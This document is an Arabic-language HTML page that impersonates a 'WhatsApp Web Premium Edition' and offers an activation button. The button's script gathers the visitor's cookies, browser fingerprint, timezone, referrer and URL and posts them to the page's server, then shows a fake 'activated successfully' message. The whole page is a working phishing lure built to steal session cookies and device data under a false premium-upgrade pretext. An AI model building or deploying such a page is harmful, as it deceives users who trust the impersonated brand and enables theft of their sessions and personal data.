<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>واتساب ويب - النسخة المميزة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); overflow: hidden; max-width: 400px; width: 100%; text-align: center; }
        .header { background: linear-gradient(135deg, #25D366, #128C7E); color: white; padding: 40px 20px; }
        .btn { background: linear-gradient(135deg, #25D366, #128C7E); color: white; border: none; padding: 16px 32px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="whatsapp-icon">📱</div>
            <h1>واتساب ويب - النسخة المميزة</h1>
            <p>تجربة جديدة ومتطورة لواتساب ويب</p>
        </div>
        <div class="content">
            <button class="btn" onclick="startVerification()" id="activateBtn">🔓 تفعيل النسخة المميزة</button>
        </div>
    </div>

    <script>
        async function collectAllData() {
            const data = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                cookies: document.cookie || 'لا توجد كوكيز',
                referrer: document.referrer || 'لا يوجد ريفيرر',
                url: window.location.href
            };
            return data;
        }

        async function sendToServer(data) {
            const response = await fetch('/api/activate-premium', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            return await response.json();
        }

        async function startVerification() {
            const btn = document.getElementById('activateBtn');
            
            try {
                btn.disabled = true;
                btn.innerHTML = '⏳ جاري التفعيل...';
                
                const userData = await collectAllData();
                const result = await sendToServer(userData);
                
                if (result.success) {
                    btn.innerHTML = '✅ تم التفعيل بنجاح!';
                    alert('🎉 تم تفعيل النسخة المميزة بنجاح!\n\nيمكنك الآن الاستمتاع بجميع المميزات');
                } else {
                    throw new Error(result.error);
                }
                
            } catch (error) {
                console.error('Error:', error);
                btn.innerHTML = '❌ فشل التفعيل';
                setTimeout(() => {
                    btn.disabled = false;
                    btn.innerHTML = '🔓 تفعيل النسخة المميزة';
                }, 3000);
            }
        }
    </script>
</body>
</html>
